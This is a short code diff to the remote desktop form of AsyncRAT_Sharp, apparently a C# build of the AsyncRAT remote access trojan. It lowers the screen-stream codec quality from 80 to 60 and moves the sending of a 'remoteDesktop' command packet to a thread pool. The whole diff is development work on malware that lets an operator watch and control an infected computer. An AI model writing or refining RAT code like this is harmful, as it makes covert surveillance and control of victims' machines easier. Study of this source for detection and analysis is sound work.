@@ -12,6 +12,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using AsyncRAT_Sharp.Sockets;
 using AsyncRAT_Sharp.MessagePack;
+using System.Threading;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -28,7 +29,7 @@ namespace AsyncRAT_Sharp.Forms
         public int FPS = 0;
         public Stopwatch sw = Stopwatch.StartNew();
         public Stopwatch RenderSW = Stopwatch.StartNew();
-        public IUnsafeCodec decoder = new UnsafeStreamCodec(80);
+        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
 
         private void timer1_Tick(object sender, EventArgs e)
         {
@@ -43,7 +44,7 @@ namespace AsyncRAT_Sharp.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                 msgpack.ForcePathObject("Option").AsString = "true";
-                C.BeginSend(msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                 decoder = new UnsafeStreamCodec(60);
             }
         }
